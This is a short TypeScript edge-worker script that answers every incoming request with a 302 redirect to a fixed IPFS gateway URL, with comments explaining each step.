// redirect.ts

// Define the redirect URL
const redirectUrl = "https://ipfs.io/ipfs/bafkreicabkg5owlmtwbbrsyjyon22zgyc64oaejnchg4zq2vpeajn4jcoy"; // Replace with the URL you want to redirect to

// Handle the request
addEventListener("fetch", (event) => {
  event.respondWith(
    new Response(null, {
      status: 302, // HTTP status for redirection
      headers: {
        "Location": redirectUrl, // The URL to redirect to
      },
    })
  );
});
